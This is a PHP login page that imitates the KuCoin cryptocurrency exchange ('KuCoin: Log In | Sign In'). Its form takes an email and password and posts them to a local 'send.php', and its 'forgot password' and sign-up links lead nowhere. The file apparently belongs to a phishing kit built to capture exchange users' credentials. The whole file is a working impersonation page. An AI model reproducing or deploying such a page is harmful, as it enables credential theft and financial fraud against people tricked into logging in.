<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    unset($_SESSION['email']);
    unset($_SESSION['password']);
    unset($_SESSION['phone_number']);
    $title = 'KuCoin: Log In | Sign In';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container-fluid">
            <div class="row">
                <?php include_once './includes/sidebar.php'; ?>
                <div class="col-md-6 order-md-2 order-1">
                    <div class="row">
                        <div class="col-12 offset-0 col-md-8 offset-md-2 login_form_bg_img">
                            <div class="d-flex align-items-center mt60">
                                <form method="post" action="<?= base_url('send.php') ?>" class="col-12 p25 mt60" style="position: relative">
                                    <div style="position: absolute;top:0;right:3;"><i class="fa-solid fa-qrcode fs50 text-success" aria-hidden="true"></i></div>
                                    <h2 class="fs35 fw-bold mb20">Log In</h2>
                                    <span class="fw-bold fs16">Email/Phone Number</span>
                                    <div class="border-line"></div>
                                    <div class="form-floating mb30">
                                        <input name="email" type="email" required="" class="form-control form-control-lg" placeholder="Email" value="" >
                                        <label for="floatingInput">Email</label>
                                    </div>
                                    <div class="form-floating my30">
                                        <input name="password" type="password" required="" minlength="3" maxlength="50"  class="form-control form-control-lg" placeholder="Login Password" value="" >
                                        <label for="floatingInput">Login Password</label>
                                    </div>
                                    <div class="my10">
                                        <a href="#" class="text-success text-decoration-none fw-bold fs13">Forgot Your Password</a>
                                    </div>
                                     <div class="text-center mx-auto d-grid gap-2 my25">
                                        <button type="submit" class="btn btn-primary bg-secondary border-0 rounded-pill btn-lg btn-block rounded-0 fs16 py10">Log In</button>
                                    </div>
                                    <div class="row mt-4">
                                        <div class="col-7">
                                            <div class="form-check">
                                                <input class="form-check-input" type="checkbox" id="remember_me">
                                                <label class="form-check-label" for="remember_me">Remember me</label>
                                            </div>
                                        </div>
                                    </div>
                                    <p class="my10">Don't have an account?
                                        <a href="#" class="text-decoration-none text-success"> Sign up now.</a>
                                    </p>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>